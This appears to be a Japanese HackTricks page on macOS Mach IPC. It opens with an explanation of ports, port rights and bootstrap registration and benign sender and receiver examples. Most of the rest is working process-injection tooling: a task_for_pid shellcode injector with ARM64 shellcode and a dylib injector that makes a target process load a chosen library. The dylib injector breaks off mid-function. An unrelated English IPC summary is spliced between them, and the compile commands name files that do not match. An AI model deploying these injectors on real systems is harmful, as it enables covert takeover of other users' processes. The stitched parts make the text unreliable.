```markdown
# macOS IPC - プロセス間通信

<details>

<summary><strong>AWSハッキングをゼロからヒーローまで学ぶには</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>をご覧ください！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksにあなたの会社を広告したい**、または**HackTricksをPDFでダウンロードしたい**場合は、[**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS & HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見する、私たちの独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクション
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)や[**テレグラムグループ**](https://t.me/peass)に**参加する**か、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)を**フォローする**。
* [**HackTricks**](https://github.com/carlospolop/hacktricks)と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のgithubリポジトリにPRを提出して、あなたのハッキングのコツを**共有する**。

</details>

## Machメッセージングとポート

### 基本情報

Machは**タスク**をリソース共有の**最小単位**として使用し、各タスクは**複数のスレッド**を含むことができます。これらの**タスクとスレッドはPOSIXプロセスとスレッドに1:1でマッピングされます**。

タスク間の通信はMachプロセス間通信（IPC）を介して行われ、片方向の通信チャネルを使用します。**メッセージはポート間で転送され**、これらはカーネルによって管理される**メッセージキュー**のように機能します。

各プロセスには**IPCテーブル**があり、そこにはプロセスの**machポート**が見つかります。machポートの名前は実際には番号（カーネルオブジェクトへのポインタ）です。

プロセスはまた、ある権利を持つポート名を**異なるタスクに送信**することができ、カーネルはこのエントリを**他のタスクのIPCテーブル**に表示させます。

### ポート権限

ポート権限は、タスクが実行できる操作を定義し、この通信の鍵となります。可能な**ポート権限**は以下の通りです：

* **受信権限**は、ポートに送信されたメッセージを受信することを可能にします。MachポートはMPSC（複数生産者、単一消費者）キューであり、システム全体で**各ポートに対して受信権限が1つだけ存在する**ことを意味します（パイプとは異なり、複数のプロセスが1つのパイプの読み取り端に対するファイルディスクリプタを持つことができます）。
* **受信権限を持つタスク**はメッセージを受信し、メッセージを送信するための**送信権限を作成**することができます。元々は**自分のタスクだけが自分のポートに対する受信権限を持っています**。
* **送信権限**は、ポートにメッセージを送信することを可能にします。
* 送信権限は**複製**することができるので、送信権限を持つタスクは権限を複製し、**第三のタスクに付与することができます**。
* **一度送信権限**は、ポートに1つのメッセージを送信した後に消える権限です。
* **ポートセット権限**は、単一のポートではなく_ポートセット_を示します。ポートセットからメッセージをデキューすると、それに含まれるポートの1つからメッセージがデキューされます。ポートセットは、Unixの`select`/`poll`/`epoll`/`kqueue`のように、同時に複数のポートを監視するために使用できます。
* **デッドネーム**は、実際のポート権限ではなく、単なるプレースホルダーです。ポートが破壊されると、そのポートへの既存のすべてのポート権限がデッドネームに変わります。

**タスクは他のタスクにSEND権限を譲渡することができ**、それによってメッセージを返送することが可能になります。**SEND権限は複製することもできるので、タスクは権限を複製して第三のタスクに付与することができます**。これにより、**ブートストラップサーバー**として知られる中間プロセスを組み合わせることで、タスク間の効果的な通信が可能になります。

### 通信の確立

#### 手順:

述べられているように、通信チャネルを確立するためには、**ブートストラップサーバー**（macでは**launchd**）が関与します。

1. タスク**A**は**新しいポート**を開始し、その過程で**受信権限**を取得します。
2. 受信権限を持つタスク**A**は、ポートのための**送信権限を生成**します。
3. タスク**A**は**ブートストラップサーバー**と**接続**を確立し、ブートストラップ登録として知られる手順を通じて、**ポートのサービス名**と**送信権限**を提供します。
4. タスク**B**は、サービス名のブートストラップ**検索を実行するためにブートストラップサーバー**と対話します。成功すると、**サーバーはタスクAから受け取った送信権限を複製し、タスクBに転送します**。
5. 送信権限を取得したタスク**B**は、**メッセージを作成**し、それをタスク**A**に**送信**することができます。
6. 双方向通信のために通常タスク**B**は新しいポートを生成し、**受信**権限と**送信**権限を持ち、タスク**A**に**送信権限を与える**ことで、タスク**B**にメッセージを送信できるようにします（双方向通信）。

ブートストラップサーバーは、タスクが主張するサービス名を**認証することはできません**。これは、タスクが**任意のシステムタスクを偽装する可能性がある**ことを意味します。例えば、**認証サービス名を偽って主張し**、その後すべてのリクエストを承認するなどです。

その後、Appleは**システム提供のサービス名**をSIP保護されたディレクトリ：`/System/Library/LaunchDaemons`および`/System/Library/LaunchAgents`にある安全な設定ファイルに保存します。各サービス名とともに、**関連するバイナリも保存されます**。ブートストラップサーバーは、これらのサービス名ごとに**受信権限を作成し保持します**。

これらの事前定義されたサービスの場合、**検索プロセスはわずかに異なります**。サービス名が検索されると、launchdはサービスを動的に開始します。新しいワークフローは以下の通りです：

* タスク**B**は、サービス名のブートストラップ**検索**を開始します。
* **launchd**はタスクが実行中かどうかを確認し、実行中でなければ**開始**します。
* タスク**A**（サービス）は**ブートストラップチェックイン**を実行します。ここで、**ブートストラップ**サーバーは送信権限を作成し、それを保持し、**受信権限をタスクAに転送します**。
* launchdは**送信権限を複製し、タスクBに送信します**。
* タスク**B**は新しいポートを生成し、**受信**権限と**送信**権限を持ち、タスク**A**（サービス）に**送信権限を与える**ことで、タスク**B**にメッセージを送信できるようにします（双方向通信）。

ただし、このプロセスは事前定義されたシステムタスクにのみ適用されます。非システムタスクは元々説明されたように動作し、偽装を可能にする可能性があります。

### Machメッセージ

Machメッセージは、**`mach_msg`関数**（基本的にはシステムコール）を使用して送信または受信されます。送信時には、この呼び出しの最初の引数は**メッセージ**でなければならず、それは**`mach_msg_header_t`**で始まり、その後に実際のペイロードが続きます：
```
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
以下は、machポートに関するメッセージの受信と送信の権限について説明しています。

machポートでメッセージを**受信**できるプロセスは、_**受信権**_を持っていると言われ、**送信者**は_**送信**_または_**一回限りの送信**_**権**を持っています。一回限りの送信は、名前が示す通り、単一のメッセージを送信した後に無効になります。

簡単な**双方向通信**を実現するために、プロセスはmach **メッセージヘッダー**に**machポート**を指定できます。これは_返信ポート_（**`msgh_local_port`**）と呼ばれ、メッセージの**受信者**がこのメッセージに**返信を送信**できる場所です。**`msgh_bits`**のビットフラグを使用して、このポートに対して**一回限りの送信** **権**が派生され、転送されることを**示す**ことができます（`MACH_MSG_TYPE_MAKE_SEND_ONCE`）。

{% hint style="success" %}
この種の双方向通信は、返信が期待されるXPCメッセージで使用されます（`xpc_connection_send_message_with_reply`および`xpc_connection_send_message_with_reply_sync`）。しかし、**通常は異なるポートが作成されます**。これは以前に説明したように双方向通信を作成するためです。
{% endhint %}

メッセージヘッダーの他のフィールドには以下が含まれます：

* `msgh_size`: パケット全体のサイズ。
* `msgh_remote_port`: このメッセージが送信されるポート。
* `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html)。
* `msgh_id`: 受信者によって解釈されるこのメッセージのID。

{% hint style="danger" %}
**machメッセージは**_**machポート**_を介して送信されることに注意してください。これはmachカーネルに組み込まれた**単一受信者**、**複数送信者**の通信チャネルです。**複数のプロセス**がmachポートにメッセージを**送信**できますが、ある時点で**単一のプロセスのみが**それから読み取ることができます。
{% endhint %}

### ポートの列挙
```bash
lsmp -p <pid>
```
このツールはiOSにインストールすることができ、[http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz) からダウンロードしてください。

### コード例

**送信者**がポートを**割り当て**、`org.darlinghq.example`という名前の**送信権**を作成し、それを**ブートストラップサーバー**に送信する一方で、受信者はその名前の**送信権**を要求し、それを使用して**メッセージを送信**することに注意してください。

{% tabs %}
{% tab title="receiver.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{% endtab %}

{% tab title="sender.c" %}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{% endtab %}
{% endtabs %}

### 特権ポート

* **ホストポート**: プロセスがこのポートに対して**送信**権限を持っている場合、**システム**に関する**情報**を取得できます（例: `host_processor_info`）。
* **ホストプリブポート**: このポートに対して**送信**権限を持つプロセスは、カーネル拡張をロードするなどの**特権アクション**を実行できます。この権限を取得するには**プロセスがrootである必要があります**。
* さらに、**`kext_request`** APIを呼び出すためには、Appleのバイナリにのみ与えられる**`com.apple.private.kext*`**という他の権限が必要です。
* **タスク名ポート**: _タスクポート_ の非特権バージョンです。タスクを参照しますが、制御することはできません。`task_info()`を通じて利用できる唯一のもののようです。
* **タスクポート**（別名カーネルポート）: このポートに対する送信権限があると、タスクを制御することができます（メモリの読み書き、スレッドの作成など）。
* 呼び出し元タスクのこのポートの名前を取得するには、`mach_task_self()`を呼び出します。このポートは**`exec()`**を介してのみ**継承**されます。`fork()`で作成された新しいタスクは新しいタスクポートを取得します（特別なケースとして、suidバイナリで`exec()`を行った後のタスクも新しいタスクポートを取得します）。タスクを生成してそのポートを取得する唯一の方法は、`fork()`を行う際に["ポートスワップダンス"](https://robert.sesek.com/2014/1/changes\_to\_xnu\_mach\_ipc.html)を実行することです。
* ポートへのアクセス制限は以下の通りです（バイナリ`AppleMobileFileIntegrity`の`macos_task_policy`から）:
* アプリが**`com.apple.security.get-task-allow`権限**を持っている場合、**同じユーザーのプロセスはタスクポートにアクセスできます**（Xcodeによってデバッグ用に一般的に追加されます）。**ノタリゼーション**プロセスは、本番リリースには許可しません。
* **`com.apple.system-task-ports`**権限を持つアプリは、カーネルを除く**任意の**プロセスの**タスクポートを取得できます**。古いバージョンでは**`task_for_pid-allow`**と呼ばれていました。これはAppleのアプリケーションにのみ付与されます。
* **ルートは、ハード化された**ランタイムでコンパイルされていない（そしてAppleからではない）アプリケーションのタスクポートにアクセスできます。

### タスクポートを介したスレッドへのシェルコード注入

シェルコードは以下から取得できます:

{% content-ref url="../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md" %}
[arm64-basic-assembly.md](../../macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md)
{% endcontent-ref %}

{% tabs %}
{% tab title="mysleep.m" %}
```objectivec
// clang -framework Foundation mysleep.m -o mysleep
// codesign --entitlements entitlements.plist -s - mysleep

#import <Foundation/Foundation.h>

double performMathOperations() {
double result = 0;
for (int i = 0; i < 10000; i++) {
result += sqrt(i) * tan(i) - cos(i);
}
return result;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
NSLog(@"Process ID: %d", [[NSProcessInfo processInfo]
processIdentifier]);
while (true) {
[NSThread sleepForTimeInterval:5];

performMathOperations();  // Silent action

[NSThread sleepForTimeInterval:5];
}
}
return 0;
}
```
{% endtab %}

{% tab title="entitlements.plist" %}
```xml
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.get-task-allow</key>
<true/>
</dict>
</plist>
```
{% endtab %}
{% endtabs %}

前のプログラムを**コンパイル**し、同じユーザーでコードをインジェクトできるように**権限**を追加してください（そうしないと**sudo**を使用する必要があります）。

<details>

<summary>sc_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit sc_injector.m -o sc_injector

#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <mach/mach_vm.h>
#include <sys/sysctl.h>


#ifdef __arm64__

kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128

// ARM64 shellcode that executes touch /tmp/lalala
char injectedCode[] = "\xff\x03\x01\xd1\xe1\x03\x00\x91\x60\x01\x00\x10\x20\x00\x00\xf9\x60\x01\x00\x10\x20\x04\x00\xf9\x40\x01\x00\x10\x20\x08\x00\xf9\x3f\x0c\x00\xf9\x80\x00\x00\x10\xe2\x03\x1f\xaa\x70\x07\x80\xd2\x01\x00\x00\xd4\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00\x00\x74\x6f\x75\x63\x68\x20\x2f\x74\x6d\x70\x2f\x6c\x61\x6c\x61\x6c\x61\x00";


int inject(pid_t pid){

task_t remoteTask;

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}

// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}

pid_t pidForProcessName(NSString *processName) {
NSArray *arguments = @[@"pgrep", processName];
NSTask *task = [[NSTask alloc] init];
[task setLaunchPath:@"/usr/bin/env"];
[task setArguments:arguments];

NSPipe *pipe = [NSPipe pipe];
[task setStandardOutput:pipe];

NSFileHandle *file = [pipe fileHandleForReading];

[task launch];

NSData *data = [file readDataToEndOfFile];
NSString *string = [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding];

return (pid_t)[string integerValue];
}

BOOL isStringNumeric(NSString *str) {
NSCharacterSet* nonNumbers = [[NSCharacterSet decimalDigitCharacterSet] invertedSet];
NSRange r = [str rangeOfCharacterFromSet: nonNumbers];
return r.location == NSNotFound;
}

int main(int argc, const char * argv[]) {
@autoreleasepool {
if (argc < 2) {
NSLog(@"Usage: %s <pid or process name>", argv[0]);
return 1;
}

NSString *arg = [NSString stringWithUTF8String:argv[1]];
pid_t pid;

if (isStringNumeric(arg)) {
pid = [arg intValue];
} else {
pid = pidForProcessName(arg);
if (pid == 0) {
NSLog(@"Error: Process named '%@' not found.", arg);
return 1;
}
else{
printf("Found PID of process '%s': %d\n", [arg UTF8String], pid);
}
}

inject(pid);
}

return 0;
}
```
<details>
<summary>macOS IPC (Inter-Process Communication)</summary>

macOS supports various IPC mechanisms, including:

- **Mach messages**: A low-level mechanism for communication between processes and the kernel.
- **XPC**: A high-level API for inter-process communication that uses Mach messages under the hood.
- **Distributed Notifications**: Allows processes to broadcast information to multiple listeners.
- **Shared memory**: Processes can map a portion of memory that can be accessed by other processes.
- **UNIX domain sockets**: Used for local inter-process communication using file system pathnames.
- **POSIX message queues**: Offers a standardized method for processes to send and receive messages.
- **Semaphores**: Used to control access to a common resource by multiple processes.
- **File locks**: Prevents concurrent access to a file by multiple processes.

Each of these mechanisms has its own use cases and security considerations. For example, Mach messages are fundamental to macOS and are used for tasks like launching processes and managing permissions. XPC is often used by applications to communicate with privileged helper tools. Understanding these IPC mechanisms is crucial for system hardening and pentesting.

</details>
```bash
gcc -framework Foundation -framework Appkit sc_inject.m -o sc_inject
./inject <pi or string>
```
### スレッドへのDylibインジェクション via タスクポート

macOSでは、**スレッド**は**Mach**を介して、または**posixの`pthread` API**を使用して操作することができます。前のインジェクションで生成されたスレッドはMach APIを使用して生成されたため、**posix準拠ではありません**。

単純なシェルコードを**インジェクトしてコマンドを実行することが可能でした**。なぜなら、posix準拠のAPIではなく、Machだけで動作する必要があったからです。**より複雑なインジェクション**では、**スレッド**も**posix準拠**である必要があります。

したがって、スレッドを**改善するためには**、**`pthread_create_from_mach_thread`**を呼び出して**有効なpthreadを作成する**べきです。その後、この新しいpthreadは**dlopenを呼び出して**システムから**dylibをロード**することができます。そのため、異なるアクションを実行するために新しいシェルコードを書く代わりに、カスタムライブラリをロードすることが可能です。

例として、ログを生成し、それを監視することができる（例えば以下のような）**サンプルdylibs**を見つけることができます：

{% content-ref url="../../macos-dyld-hijacking-and-dyld_insert_libraries.md" %}
[macos-dyld-hijacking-and-dyld\_insert\_libraries.md](../../macos-dyld-hijacking-and-dyld\_insert\_libraries.md)
{% endcontent-ref %}

<details>

<summary>dylib_injector.m</summary>
```objectivec
// gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
// Based on http://newosxbook.com/src.jl?tree=listings&file=inject.c
#include <dlfcn.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <mach/mach.h>
#include <mach/error.h>
#include <errno.h>
#include <stdlib.h>
#include <sys/sysctl.h>
#include <sys/mman.h>

#include <sys/stat.h>
#include <pthread.h>


#ifdef __arm64__
//#include "mach/arm/thread_status.h"

// Apple says: mach/mach_vm.h:1:2: error: mach_vm.h unsupported
// And I say, bullshit.
kern_return_t mach_vm_allocate
(
vm_map_t target,
mach_vm_address_t *address,
mach_vm_size_t size,
int flags
);

kern_return_t mach_vm_write
(
vm_map_t target_task,
mach_vm_address_t address,
vm_offset_t data,
mach_msg_type_number_t dataCnt
);


#else
#include <mach/mach_vm.h>
#endif


#define STACK_SIZE 65536
#define CODE_SIZE 128


char injectedCode[] =

// "\x00\x00\x20\xd4" // BRK X0     ; // useful if you need a break :)

// Call pthread_set_self

"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
"\x00\x00\x00\x14" // loop: b loop              ; loop forever

// Call dlopen with the path to the library
"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()

// Call pthread_exit
"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit

"PTHRDCRT"  // <-
"PTHRDEXT"  // <-
"DLOPEN__"  // <-
"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;




int inject(pid_t pid, const char *lib) {

task_t remoteTask;
struct stat buf;

// Check if the library exists
int rc = stat (lib, &buf);

if (rc != 0)
{
fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
//return (-9);
}

// Get access to the task port of the process we want to inject into
kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
if (kr != KERN_SUCCESS) {
fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
return (-1);
}
else{
printf("Gathered privileges over the task port of process: %d\n", pid);
}

// Allocate memory for the stack
mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
return (-2);
}
else
{

fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
}

// Allocate memory for the code
remoteCode64 = (vm_address_t) NULL;
kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
return (-2);
}


// Patch shellcode

int i = 0;
char *possiblePatchLocation = (injectedCode );
for (i = 0 ; i < 0x100; i++)
{

// Patching is crude, but works.
//
extern void *_pthread_set_self;
possiblePatchLocation++;


uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
uint64_t addrOfDlopen = (uint64_t) dlopen;

if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
}

if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
{
memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
}

if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
{
printf ("DLOpen @%llx\n", addrOfDlopen);
memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
}

if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
{
strcpy(possiblePatchLocation, lib );
}
}

// Write the shellcode to the allocated memory
kr = mach_vm_write(remoteTask,                   // Task port
remoteCode64,                 // Virtual Address (Destination)
(vm_address_t) injectedCode,  // Source
0xa9);                       // Length of the source


if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
return (-3);
}


// Set the permissions on the allocated code memory
kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
return (-4);
}

// Set the permissions on the allocated stack memory
kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);

if (kr != KERN_SUCCESS)
{
fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
return (-4);
}


// Create thread to run shellcode
struct arm_unified_thread_state remoteThreadState64;
thread_act_t         remoteThread;

memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );

remoteStack64 += (STACK_SIZE / 2); // this is the real stack
//remoteStack64 -= 8;  // need alignment of 16

const char* p = (const char*) remoteCode64;

remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;

printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );

kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );

if (kr != KERN_SUCCESS) {
fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
return (-3);
}

return (0);
}



int main(int argc, const char * argv[])
{
if (argc < 3)
{
fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
fprintf (stderr, "   _action_: path to a dylib on disk\n");
exit(0);
}

pid_t pid = atoi(argv[1]);
const char *action = argv[2];
struct stat buf;

int rc = stat (action, &buf);
